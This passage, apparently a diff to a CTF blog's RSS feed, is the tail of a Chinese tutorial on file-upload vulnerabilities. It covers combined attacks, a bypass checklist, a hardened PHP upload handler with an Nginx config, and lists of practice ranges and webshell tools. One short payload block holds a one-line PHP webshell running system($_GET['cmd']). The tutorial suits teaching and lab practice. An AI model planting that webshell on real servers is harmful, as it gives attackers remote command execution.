+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;组合&lt;/th&gt;
+&lt;th&gt;原理&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;上传 + 文件包含（LFI）&lt;/td&gt;
+&lt;td&gt;图片马 + 任意文件读取/包含 → RCE&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;上传 + 命令注入&lt;/td&gt;
+&lt;td&gt;文件名进入 shell 命令，&lt;code&gt;;&lt;/code&gt;、`&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;上传 + SQL 注入&lt;/td&gt;
+&lt;td&gt;文件名拼入 SQL 查询&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;上传 + SSRF&lt;/td&gt;
+&lt;td&gt;上传的 URL 触发服务端请求&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ZIP 解压 + 路径穿越&lt;/td&gt;
+&lt;td&gt;解压恶意 zip 覆盖任意文件（Zip Slip）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;hr /&gt;
+&lt;h2&gt;十、实战排查流程（Checklist）&lt;/h2&gt;
+&lt;p&gt;我一般按这个顺序排：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;先传一张正常小图，把请求和响应留好。&lt;/li&gt;
+&lt;li&gt;找上传后的文件名和访问路径，看服务端有没有重命名。&lt;/li&gt;
+&lt;li&gt;扩展名、MIME、文件头分开改，一次只动一个地方。&lt;/li&gt;
+&lt;li&gt;从响应头、报错、路径格式里猜 Web 服务器、语言和操作系统，但别只信 &lt;code&gt;Server&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;黑名单先试大小写、双写和已知替代后缀，再看 Windows 文件名特性。&lt;/li&gt;
+&lt;li&gt;白名单先分清它只看文件头，还是真的解码、重绘了图片。&lt;/li&gt;
+&lt;li&gt;文件传上去以后，用固定回显确认是否解析。不能执行就继续找 LFI、配置文件或路径问题。&lt;/li&gt;
+&lt;li&gt;最后再看先存后删、随机文件名、目录穿越、覆盖和压缩包解压这些逻辑点。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;常用验证 payload&lt;/strong&gt;：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php echo &apos;upload-ok&apos;; ?&amp;gt;                         // 只验证 PHP 解析
+&amp;lt;?php if (isset($_GET[&apos;cmd&apos;])) system($_GET[&apos;cmd&apos;]); ?&amp;gt; // CTF 命令执行
+&amp;lt;?php phpinfo(); ?&amp;gt;                                // 查看题目 PHP 环境
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;十一、防御措施&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;安全代码骨架（PHP 7+ 示例）&lt;/strong&gt;：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+declare(strict_types=1);
+
+const MAX_UPLOAD_BYTES = 5 * 1024 * 1024;
+const MAX_IMAGE_PIXELS = 20000000;
+
+if (!isset($_FILES[&apos;file&apos;])
+    || !is_array($_FILES[&apos;file&apos;])
+    || !isset($_FILES[&apos;file&apos;][&apos;error&apos;], $_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $_FILES[&apos;file&apos;][&apos;name&apos;])
+    || is_array($_FILES[&apos;file&apos;][&apos;error&apos;])
+    || $_FILES[&apos;file&apos;][&apos;error&apos;] !== UPLOAD_ERR_OK) {
+    http_response_code(400);
+    exit(&apos;upload failed&apos;);
+}
+
+$file = $_FILES[&apos;file&apos;];
+$tmp = $file[&apos;tmp_name&apos;];
+$size = filesize($tmp);
+
+if (!is_uploaded_file($tmp) || $size === false || $size &amp;gt; MAX_UPLOAD_BYTES) {
+    http_response_code(400);
+    exit(&apos;invalid upload&apos;);
+}
+
+$allowed = [
+    &apos;jpg&apos; =&amp;gt; [&apos;mime&apos; =&amp;gt; &apos;image/jpeg&apos;, &apos;type&apos; =&amp;gt; IMAGETYPE_JPEG],
+    &apos;png&apos; =&amp;gt; [&apos;mime&apos; =&amp;gt; &apos;image/png&apos;,  &apos;type&apos; =&amp;gt; IMAGETYPE_PNG],
+    &apos;gif&apos; =&amp;gt; [&apos;mime&apos; =&amp;gt; &apos;image/gif&apos;,  &apos;type&apos; =&amp;gt; IMAGETYPE_GIF],
+];
+
+$ext = strtolower(pathinfo((string) $file[&apos;name&apos;], PATHINFO_EXTENSION));
+if (!isset($allowed[$ext])) {
+    http_response_code(415);
+    exit(&apos;unsupported extension&apos;);
+}
+
+$mime = (new finfo(FILEINFO_MIME_TYPE))-&amp;gt;file($tmp);
+$info = @getimagesize($tmp);
+$expected = $allowed[$ext];
+
+if ($info === false
+    || $mime !== $expected[&apos;mime&apos;]
+    || $info[2] !== $expected[&apos;type&apos;]
+    || $info[0] * $info[1] &amp;gt; MAX_IMAGE_PIXELS) {
+    http_response_code(415);
+    exit(&apos;invalid image&apos;);
+}
+
+switch ($info[2]) {
+    case IMAGETYPE_JPEG:
+        $image = @imagecreatefromjpeg($tmp);
+        break;
+    case IMAGETYPE_PNG:
+        $image = @imagecreatefrompng($tmp);
+        break;
+    case IMAGETYPE_GIF:
+        $image = @imagecreatefromgif($tmp);
+        break;
+    default:
+        $image = false;
+}
+
+if ($image === false) {
+    http_response_code(415);
+    exit(&apos;decode failed&apos;);
+}
+
+// UPLOAD_DIR 应位于 Web 根目录外，并预先设置最小权限。
+$name = bin2hex(random_bytes(16)) . &apos;.&apos; . $ext;
+$path = rtrim(UPLOAD_DIR, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
+
+switch ($info[2]) {
+    case IMAGETYPE_JPEG:
+        $saved = imagejpeg($image, $path, 90);
+        break;
+    case IMAGETYPE_PNG:
+        $saved = imagepng($image, $path, 6);
+        break;
+    case IMAGETYPE_GIF:
+        $saved = imagegif($image, $path);
+        break;
+    default:
+        $saved = false;
+}
+imagedestroy($image);
+
+if (!$saved) {
+    http_response_code(500);
+    exit(&apos;save failed&apos;);
+}
+
+echo $name;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;必须用 Nginx 直接提供上传文件时，可以给上传目录单独配一个静态 location。能放到 Web 根目录外或独立静态域名更省心。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;location ^~ /uploads/ {
+    types { }
+    default_type application/octet-stream;
+    add_header X-Content-Type-Options nosniff always;
+    try_files $uri =404;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;十二、练习靶场与工具&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;类型&lt;/th&gt;
+&lt;th&gt;名称&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;靶场&lt;/td&gt;
+&lt;td&gt;Upload-Labs&lt;/td&gt;
+&lt;td&gt;21 关专项练习文件上传，逐关递进&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;靶场&lt;/td&gt;
+&lt;td&gt;DVWA&lt;/td&gt;
+&lt;td&gt;经典综合靶场，含文件上传模块&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;靶场&lt;/td&gt;
+&lt;td&gt;Pikachu&lt;/td&gt;
+&lt;td&gt;中文靶场，覆盖多种 Web 漏洞&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;靶场&lt;/td&gt;
+&lt;td&gt;PortSwigger Web Security Academy&lt;/td&gt;
+&lt;td&gt;文件上传实验覆盖类型校验、路径和解析配置&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;靶场&lt;/td&gt;
+&lt;td&gt;Sqli-labs 衍生&lt;/td&gt;
+&lt;td&gt;部分关卡含上传与包含组合&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;工具&lt;/td&gt;
+&lt;td&gt;Burp Suite 或 Yakit&lt;/td&gt;
+&lt;td&gt;抓包改包，绕过前端/MIME 校验&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;工具&lt;/td&gt;
+&lt;td&gt;蚁剑（AntSword）&lt;/td&gt;
+&lt;td&gt;连接一句话 webshell&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;工具&lt;/td&gt;
+&lt;td&gt;冰蝎 / 哥斯拉&lt;/td&gt;
+&lt;td&gt;加密流量 webshell 管理（进阶）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;工具&lt;/td&gt;
+&lt;td&gt;exiftool&lt;/td&gt;
+&lt;td&gt;往图片 EXIF 里插 payload&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;hr /&gt;
+&lt;h2&gt;最后记一下&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;先找过滤点，再找落地路径和触发方式。上传成功不等于解析成功，网上看到的 payload 也不一定适合题目环境。&lt;/p&gt;
+&lt;/blockquote&gt;
+</content:encoded></item><item><title>First CTF Note</title><link>https://freya-we.github.io/2026/02/07/first-ctf-note/</link><guid isPermaLink="true">https://freya-we.github.io/2026/02/07/first-ctf-note/</guid><description>This is a sample note. Replace it with a real CTF writeup when you are ready.</description><pubDate>Sat, 07 Feb 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This is a sample note. Replace it with a real CTF writeup when you are ready.&lt;/p&gt;
 &lt;h2&gt;Summary&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;Challenge:&lt;/strong&gt;&lt;/li&gt;
